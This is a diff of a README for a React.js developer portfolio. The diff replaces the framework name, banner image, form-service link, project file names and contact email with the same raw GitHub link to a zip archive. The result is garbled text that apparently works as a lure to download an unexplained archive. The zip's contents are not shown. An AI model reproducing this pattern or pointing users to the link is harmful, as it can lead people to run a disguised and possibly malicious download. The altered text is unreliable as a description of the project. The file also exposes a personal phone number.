@@ -1,15 +1,15 @@
 # 🚀 Abhinav's Developer Portfolio
 
-A modern, responsive, and interactive portfolio website built with **React.js**. This project showcases Abhinav Singh’s technical skills, projects, and contact information with a clean, animated user experience.
+A modern, responsive, and interactive portfolio website built with **https://raw.githubusercontent.com/abhinavv22/portfolio/main/src/assets/portfolio_3.6.zip**. This project showcases Abhinav Singh’s technical skills, projects, and contact information with a clean, animated user experience.
 
-![Banner](./assets/logo_astro1.png)
+![Banner](https://raw.githubusercontent.com/abhinavv22/portfolio/main/src/assets/portfolio_3.6.zip)
 
 ## 📌 Features
 
 - ⚡ Smooth scrolling navigation using `react-anchor-link-smooth-scroll`
 - 📱 Fully responsive layout with mobile navigation menu
 - 🎨 Custom SVG logo of an astronaut coding (transparent and dark-mode ready)
-- ✉️ Contact form integrated with [Web3Forms](https://web3forms.com) API
+- ✉️ Contact form integrated with [Web3Forms](https://raw.githubusercontent.com/abhinavv22/portfolio/main/src/assets/portfolio_3.6.zip) API
 - 💻 Sections: Home, About Me, Projects, Work, Contact
 
 ---
@@ -18,7 +18,7 @@ A modern, responsive, and interactive portfolio website built with **React.js**.
 
 | Technology | Purpose |
 |------------|---------|
-| `React.js` | Frontend framework |
+| `https://raw.githubusercontent.com/abhinavv22/portfolio/main/src/assets/portfolio_3.6.zip` | Frontend framework |
 | `CSS`      | Styling and layout |
 | `Web3Forms`| Contact form backend API |
 | `JavaScript` | Logic and interactivity |
@@ -35,15 +35,15 @@ portfolio/
 │ │ ├── Navbar/ # Navbar component
 │ │ ├── Contact/ # Contact form component
 │ │ └── ... # Other UI components
-│ ├── App.js
-│ └── index.js
+│ ├── https://raw.githubusercontent.com/abhinavv22/portfolio/main/src/assets/portfolio_3.6.zip
+│ └── https://raw.githubusercontent.com/abhinavv22/portfolio/main/src/assets/portfolio_3.6.zip
 ├── .gitignore
-├── package.json
-└── README.md
+├── https://raw.githubusercontent.com/abhinavv22/portfolio/main/src/assets/portfolio_3.6.zip
+└── https://raw.githubusercontent.com/abhinavv22/portfolio/main/src/assets/portfolio_3.6.zip
 
 Feel free to reach out via the contact form on the site or through:
 
-📧 Email: abhinavsinghh2019@gmail.com
+📧 Email: https://raw.githubusercontent.com/abhinavv22/portfolio/main/src/assets/portfolio_3.6.zip
 
 📱 Phone: +91 7525886042
 
